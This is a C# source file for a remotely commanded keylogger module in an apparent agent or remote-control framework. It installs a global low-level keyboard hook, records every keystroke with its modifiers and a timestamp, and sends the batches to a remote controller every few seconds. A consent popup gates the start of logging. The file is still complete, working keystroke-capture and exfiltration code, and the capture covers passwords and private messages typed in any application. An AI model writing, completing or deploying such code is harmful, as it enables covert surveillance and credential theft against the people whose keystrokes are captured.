using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using AgentSystem.Core;
using AgentSystem.Managers;

namespace AgentSystem.Modules
{
    public class KeyloggerModule : BaseModule
    {
        private bool isLogging = false;
        private string activeCommandId = string.Empty;
        private Thread hookThread; 
        private uint hookThreadId = 0;
        private readonly object _stateLock = new object();

        private readonly List<object> keyBuffer = new List<object>();
        private readonly object bufferLock = new object();
        
        // Thay Timer cũ bằng CancellationTokenSource + PeriodicTimer
        private CancellationTokenSource flushCts;

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const uint WM_QUIT = 0x0012;

        private LowLevelKeyboardProc hookProc; 
        private IntPtr hookId = IntPtr.Zero;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool PostThreadMessage(uint threadId, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        private static extern short GetAsyncKeyState(int keyCode);

        public override string[] SupportedCommands => new[] { "keylog_start", "keylog_stop" };

        public KeyloggerModule(IAgentContext context, SecurityManager security, UIManager ui) 
            : base(context, security, ui)
        {
            hookProc = HookCallback; 
        }

        public override async Task ExecuteAsync(string action, JsonElement parameters, string commandId)
        {
            if (action == "keylog_start")
            {
                await StartLoggingAsync(commandId);
            }
            else if (action == "keylog_stop")
            {
                StopLogging(commandId);
            }
        }

        private async Task StartLoggingAsync(string commandId)
        {
            lock (_stateLock)
            {
                if (isLogging) return;
            }

            // Gọi Popup Consent bất đồng bộ
            bool isApproved = await ui.ShowConsentPopupAsync("keylogger", 30000); 
            if (!isApproved) 
            {
                context.SendResponse(new { type = "keylog_denied", agent_id = context.AgentId, command_id = commandId, reason = "User declined permission" });
                return; 
            }

            lock (_stateLock)
            {
                if (isLogging) return; 

                activeCommandId = commandId;
                isLogging = true;

                // Hook bắt buộc chạy trên Thread có Message Loop
                hookThread = new Thread(() =>
                {
                    hookId = SetHook(hookProc);
                    Application.Run(); 
                });
                
                hookThread.SetApartmentState(ApartmentState.STA);
                hookThread.IsBackground = true; 
                hookThread.Start();

                context.SendResponse(new { type = "keylog_started", agent_id = context.AgentId, command_id = commandId });
                
                flushCts = new CancellationTokenSource();
                _ = FlushLoopAsync(flushCts.Token);
            }
        }

        private void StopLogging(string commandId)
        {
            lock (_stateLock)
            {
                if (!isLogging) return;
                
                // Hủy vòng lặp gửi dữ liệu
                flushCts?.Cancel();
                flushCts?.Dispose();
                flushCts = null;
                
                if (hookId != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(hookId);
                    hookId = IntPtr.Zero;
                }
                if (hookThreadId != 0)
                {
                    PostThreadMessage(hookThreadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
                    hookThreadId = 0;
                }

                hookThread = null; 
                isLogging = false;
                FlushBuffer(); // Đẩy dữ liệu còn sót
                
                context.SendResponse(new { type = "keylog_stopped", agent_id = context.AgentId, command_id = commandId });
            }
        }

        private async Task FlushLoopAsync(CancellationToken token)
        {
            using var timer = new PeriodicTimer(TimeSpan.FromMilliseconds(3000));
            try
            {
                while (await timer.WaitForNextTickAsync(token))
                {
                    FlushBuffer();
                }
            }
            catch (OperationCanceledException)
            {
                // Vòng lặp dừng khi tắt module
            }
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                var mainModule = curProcess.MainModule;
                if (mainModule == null) return IntPtr.Zero;
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(mainModule.ModuleName), 0);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);

                bool isShift = (GetAsyncKeyState(0x10) & 0x8000) != 0; 
                bool isCtrl = (GetAsyncKeyState(0x11) & 0x8000) != 0;  
                bool isAlt = (GetAsyncKeyState(0x12) & 0x8000) != 0;   

                var keyEvent = new
                {
                    key = ((ConsoleKey)vkCode).ToString(), 
                    ctrl = isCtrl,
                    alt = isAlt,
                    shift = isShift,
                    timestamp_ms = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
                };

                lock (bufferLock)
                {
                    keyBuffer.Add(keyEvent);
                }
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        private void FlushBuffer()
        {
            List<object> batchToSend;

            lock (bufferLock)
            {
                if (keyBuffer.Count == 0) return;
                batchToSend = new List<object>(keyBuffer);
                keyBuffer.Clear();
            }

            context.SendResponse(new
            {
                type = "keylog",
                command_id = activeCommandId,
                events = batchToSend
            });
        }
    }
}